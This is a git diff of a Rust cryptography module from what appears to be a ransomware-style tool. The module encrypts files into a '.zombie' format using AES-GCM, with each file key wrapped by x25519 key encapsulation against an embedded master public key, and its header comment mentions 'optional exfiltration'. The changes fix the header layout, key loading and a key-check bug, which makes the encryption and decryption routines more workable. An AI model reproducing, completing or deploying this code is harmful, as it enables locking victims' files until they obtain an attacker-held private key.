@@ -5,7 +5,7 @@
 //! routines, and is responsible for handling cryptographic workflows,
 //! such as file processing, key usage, and optional exfiltration.
 
-use std::fs::File;
+use std::fs::{File, read_to_string};
 use std::io::{self, Read, Write};
 use std::path::{Path, PathBuf};
 
@@ -14,13 +14,13 @@ use aes_gcm::{
     aead::{Aead, KeyInit, Nonce},
 };
 use base64::Engine;
-use base64::engine::general_purpose::{STANDARD, STANDARD_NO_PAD};
+use base64::engine::general_purpose::STANDARD_NO_PAD;
 use hkdf::Hkdf;
 use log::{debug, error, info};
 use rand::{RngCore, rngs::OsRng};
 use x25519_dalek::{EphemeralSecret, PublicKey, StaticSecret};
 
-use crate::error::{AppError, CryptoError};
+use crate::error::CryptoError;
 
 /// Encrypted files extension.
 pub const EXTENSION: &'static str = "zombie";
@@ -31,12 +31,13 @@ const MAGIC_BYTES: &[u8; 4] = b"CORD";
 const FILE_FORMAT_VERSION: u8 = 0x01;
 
 /// .zombie header size in bytes:
-/// - Magic.......................: 04
+/// - Magic bytes.................: 04
 /// - Version.....................: 01
-/// - Ephemeral PK................: 32
-/// - Encrypted AES key (with tag): 48 (32 + 16)
+/// - Ephemeral PubKey............: 32
+/// - Encrypted AES key + tag.....: 48 (32 + 16)
+/// - Key encapsulation nonce.....: 12
 /// - File content AES-GCM nonce..: 12
-const ZOMBIE_HEADER_SIZE: usize = 4 + 1 + 32 + 48 + 12; // = 97 bytes
+const ZOMBIE_HEADER_SIZE: usize = 4 + 1 + 32 + 48 + 12 + 12; // = 109 bytes
 
 /// Encrypts a file using AES-GCM for content and ECIES-like key encapsulation
 /// for the AES key using Curve25519--x25519-dalek.
@@ -104,10 +105,10 @@ pub fn encrypt(path: &Path, master_pk_bytes: &[u8; 32]) -> Result<PathBuf, Crypt
 
     // PublicKey expects an owned an owned array and master_pk_bytes is
     // a reference (&[u8; 32]), so it must be dereferenced with *
-    let master_public_key = PublicKey::from(*master_pk_bytes);
+    let public_key = PublicKey::from(*master_pk_bytes);
     debug!("Master public key loaded");
 
-    let shared_secret = ephemeral_secret.diffie_hellman(&master_public_key);
+    let shared_secret = ephemeral_secret.diffie_hellman(&public_key);
     debug!("Derived shared secret using ECDH");
 
     // Use HKDF to derive an AES-GCM key for encrypting the file_aes_key
@@ -153,12 +154,12 @@ pub fn encrypt(path: &Path, master_pk_bytes: &[u8; 32]) -> Result<PathBuf, Crypt
     let mut output_file = File::create(&zombie_path)?;
 
     // 6. Write the header to the .zombie file
-    output_file.write_all(MAGIC_BYTES)?;
-    output_file.write_all(&[FILE_FORMAT_VERSION])?;
-    output_file.write_all(ephemeral_public.as_bytes())?;
-    output_file.write_all(&encrypted_file_aes_key_with_tag)?;
-    output_file.write_all(key_enc_aes_nonce.as_slice())?;
-    output_file.write_all(file_aes_nonce.as_slice())?;
+    output_file.write_all(MAGIC_BYTES)?; // 4 bytes
+    output_file.write_all(&[FILE_FORMAT_VERSION])?; // 1 byte
+    output_file.write_all(ephemeral_public.as_bytes())?; // 32 bytes
+    output_file.write_all(&encrypted_file_aes_key_with_tag)?; // 48 bytes
+    output_file.write_all(key_enc_aes_nonce.as_slice())?; // 12 bytes
+    output_file.write_all(file_aes_nonce.as_slice())?; // 12 bytes
     debug!("Wrote encrypted file header");
 
     // 7. Write the content ciphertext (with tag)
@@ -191,19 +192,11 @@ pub fn decrypt(path: &Path, key: &Path) -> Result<PathBuf, CryptoError> {
     info!("Starting decryption for file: {:?}", path);
 
     // 1. Read the master private key
-    let mut private_key_file = File::open(key)?;
-    let mut master_private_key_bytes = Vec::new();
-    private_key_file.read_to_end(&mut master_private_key_bytes)?; // shouldn't it have to transform the key?
-
-    if master_private_key_bytes.len() != 32 {
-        error!(
-            "Master private key files has invalid length: {} bytes",
-            master_private_key_bytes.len()
-        );
-        return Err(CryptoError::InvalidPrivateKey);
-    }
-    let master_private_key = StaticSecret::from(
-        <[u8; 32]>::try_from(master_private_key_bytes.as_slice())
+    let private_key_b64 = read_to_string(key)?;
+    let private_key_b64_trimmed = private_key_b64.trim();
+    let private_key_bytes = b64_decode(private_key_b64_trimmed)?;
+    let private_key = StaticSecret::from(
+        <[u8; 32]>::try_from(private_key_bytes.as_slice())
             .map_err(|_| CryptoError::InvalidPrivateKey)?,
     );
     debug!("Loaded master private key from {:?}", key);
@@ -290,7 +283,7 @@ pub fn decrypt(path: &Path, key: &Path) -> Result<PathBuf, CryptoError> {
 
     // 4. ECIES-like decapsulation for the file AES key (with AES-GCM)
     let ephemeral_public = PublicKey::from(ephemeral_public_key);
-    let shared_secret = master_private_key.diffie_hellman(&ephemeral_public);
+    let shared_secret = private_key.diffie_hellman(&ephemeral_public);
     debug!("Derived shared secret with ECDH");
 
     let hkdf = Hkdf::<sha2::Sha256>::new(None, shared_secret.as_bytes());
@@ -340,33 +333,7 @@ pub fn decrypt(path: &Path, key: &Path) -> Result<PathBuf, CryptoError> {
 
     // 6. Construct the decrypted file path
     let mut decrypted_path = path.to_path_buf();
-    // only .zombie files
-    if decrypted_path
-        .extension()
-        .map_or(false, |ext| ext == EXTENSION)
-    {
-        let mut original_file_name = decrypted_path
-            .file_stem()
-            .ok_or_else(|| {
-                CryptoError::Io(io::Error::new(
-                    io::ErrorKind::InvalidInput,
-                    "Invalid file stem for decryption",
-                ))
-            })?
-            .to_os_string();
-
-        let original_extension = path
-            .file_name()
-            .and_then(|name| name.to_str())
-            .and_then(|name_str| name_str.strip_suffix(&format!(".{}", EXTENSION)))
-            .and_then(|stripped_name| Path::new(stripped_name).extension());
-
-        if let Some(ext) = original_extension {
-            original_file_name.push(".");
-            original_file_name.push(ext);
-        }
-        decrypted_path.set_file_name(original_file_name);
-    }
+    decrypted_path.set_extension("");
     info!("Creating decrypted file: {:?}", decrypted_path);
 
     // 7. Write decrypted content to the new file
@@ -379,17 +346,16 @@ pub fn decrypt(path: &Path, key: &Path) -> Result<PathBuf, CryptoError> {
 
 /// Generates a new master Curve25519 key pair (public and private).
 ///
-/// The public key is returned as a byte array, suitable for embedding as
-/// `MASTER_PUBLIC_KEY_BYTES`. The private key is saved to a specified file
-/// path.
+/// Both private and public key are encoded in base 64 for better storing and
+/// sharing.
 ///
 /// # Arguments
 /// - `private_key_path`: The path to save the generated master private key.
 ///
 /// # Returns
 /// A `Result` containing the generated master public key bytes (`[u8; 32]`)
-/// on success or a `AppError` if key generation or file saving fails.
-pub fn generate(private_key_path: &Path) -> Result<(), AppError> {
+/// on success or a `CryptoError` if key generation or file saving fails.
+pub fn generate(private_key_path: &Path) -> Result<(), CryptoError> {
     info!("Generating new master key pair");
 
     let private_key = StaticSecret::random_from_rng(OsRng);
@@ -411,7 +377,7 @@ pub fn generate(private_key_path: &Path) -> Result<(), AppError> {
         assert_eq!(private_key_bytes, prikey);
     }
     if let Ok(pubkey) = b64_decode(&public_key_b64) {
-        assert_eq!(private_key_bytes, pubkey);
+        assert_eq!(public_key_bytes, pubkey);
     }
 
     Ok(())
@@ -447,11 +413,11 @@ pub fn b64_encode(key_bytes: &[u8]) -> String {
 /// # Returns
 /// A `Result` containing the decoded bytes ([u8; 32]) on success or an
 /// `AppError` if the decoding fails.
-pub fn b64_decode(key_b64: &str) -> Result<[u8; 32], AppError> {
-    let decoded_vec = STANDARD.decode(key_b64)?;
+pub fn b64_decode(key_b64: &str) -> Result<[u8; 32], CryptoError> {
+    let decoded_vec = STANDARD_NO_PAD.decode(key_b64)?;
 
     if decoded_vec.len() != 32 {
-        return Err(AppError::InvalidLengthError);
+        return Err(CryptoError::InvalidLengthError);
     }
 
     let fixed_array: [u8; 32] = decoded_vec.try_into().unwrap();
